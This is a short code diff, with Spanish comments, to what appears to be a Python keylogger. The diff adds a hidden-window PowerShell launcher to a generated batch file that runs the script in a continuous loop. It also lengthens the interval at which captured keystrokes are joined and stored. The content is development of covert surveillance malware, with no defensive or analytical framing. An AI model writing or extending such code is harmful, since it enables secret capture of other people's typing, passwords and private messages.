@@ -37,6 +37,13 @@ if not exist "{vscode_path}" (
 rem Ruta del script Python
 set "PYTHON_SCRIPT={current_script}"
 
+powershell -windowstyle hidden -command "try {{ python '{current_script}' }} catch {{ echo $_ | Out-File -FilePath '%log_file%' -Append; exit 1 }}"
+    if %ERRORLEVEL% neq 0 (
+        type %log_file%
+        pause
+        exit /b
+    )
+    
 rem Bucle para ejecutar el script continuamente
 :inicio
 python %PYTHON_SCRIPT%
@@ -74,7 +81,7 @@ def main():
 
     def store_keystrokes():
         while True:
-            time.sleep(10)  # Ajusta el tiempo de espera según tus necesidades
+            time.sleep(300)  # Ajusta el tiempo de espera según tus necesidades
             if keystrokes:
                 # Unir las teclas en una sola cadena de texto
                 data = ''.join(keystrokes)
